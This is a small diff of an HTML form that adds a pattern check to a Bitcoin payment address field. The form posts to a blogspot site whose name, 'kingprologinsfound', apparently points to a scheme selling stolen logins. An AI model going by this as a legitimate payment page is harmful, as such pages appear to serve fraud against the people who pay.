@@ -84,7 +84,7 @@ function myFunction() {
 }</script>
 		  </div>
 		 <form action="https://kingprologinsfound.blogspot.com/" method=""> <div class="user-box"> 
-         <input type="text" name="" required="required" maxlength="35" minlength="26"> 
+         <input type="text" name="" required="required" pattern=".{26,35}" required title="Invaild Bitcoin Address"> 
          <label>User Bitcoin Payment Address</label> 
          </div> 
          <div class="user-box"> 
